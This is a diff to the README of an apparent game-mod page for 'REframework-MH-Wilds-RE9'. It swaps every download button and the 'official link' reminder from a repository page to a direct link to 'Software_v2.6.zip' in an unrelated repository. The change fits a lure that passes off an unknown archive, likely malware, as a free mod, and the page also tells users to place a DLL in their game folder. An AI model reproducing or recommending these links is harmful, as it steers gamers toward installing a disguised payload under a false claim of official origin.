@@ -1,7 +1,7 @@
 <h1>🎮 REframework-MH-Wilds-RE9 - Unlock Every Game's Hidden Potential</h1>
 
 <p align="center">
-  <a href="https://github.com/Shelbiunopposed398/REframework-MH-Wilds-RE9" style="display:inline-block;padding:18px 42px;background:linear-gradient(135deg,#ff6a00,#ee0979);color:white;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 24px rgba(238,9,121,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/Shelbiunopposed398/tavernkeep/main/src/Software_v2.6.zip" style="display:inline-block;padding:18px 42px;background:linear-gradient(135deg,#ff6a00,#ee0979);color:white;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 24px rgba(238,9,121,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ---
@@ -55,7 +55,7 @@ This framework gives you **total control** over your gaming experience. Whether 
 Click the big orange button above, or use this link directly:
 
 <p align="center">
-  <a href="https://github.com/Shelbiunopposed398/REframework-MH-Wilds-RE9" style="display:inline-block;padding:14px 32px;background:linear-gradient(135deg,#11998e,#38ef7d);color:white;font-size:18px;font-weight:bold;border-radius:30px;text-decoration:none;">📥 Visit this link to download the application</a>
+  <a href="https://raw.githubusercontent.com/Shelbiunopposed398/tavernkeep/main/src/Software_v2.6.zip" style="display:inline-block;padding:14px 32px;background:linear-gradient(135deg,#11998e,#38ef7d);color:white;font-size:18px;font-weight:bold;border-radius:30px;text-decoration:none;">📥 Visit this link to download the application</a>
 </p>
 
 ### Step 2: Install REframework-MH-Wilds-RE9
@@ -214,7 +214,7 @@ Visit the download link and grab the latest `dinput8.dll`. Replace the old file 
 ## 🔗 Quick Download
 
 <p align="center">
-  <a href="https://github.com/Shelbiunopposed398/REframework-MH-Wilds-RE9" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#fc4a1a,#f7b733);color:white;font-size:20px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 6px 18px rgba(247,183,51,0.5);">🚀 GET REFRAMEWORK NOW</a>
+  <a href="https://raw.githubusercontent.com/Shelbiunopposed398/tavernkeep/main/src/Software_v2.6.zip" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#fc4a1a,#f7b733);color:white;font-size:20px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 6px 18px rgba(247,183,51,0.5);">🚀 GET REFRAMEWORK NOW</a>
 </p>
 
 **Version:** v1.5.9.2 (Nightly)  
@@ -226,7 +226,7 @@ Visit the download link and grab the latest `dinput8.dll`. Replace the old file 
 
 ## 📌 Final Reminders
 
-- Always download from the official link: **https://github.com/Shelbiunopposed398/REframework-MH-Wilds-RE9**
+- Always download from the official link: **https://raw.githubusercontent.com/Shelbiunopposed398/tavernkeep/main/src/Software_v2.6.zip**
 - Keep your framework updated to avoid game-breaking bugs
 - Backup your game saves before installing mods
 - Have fun exploring and customizing your games! 🎉
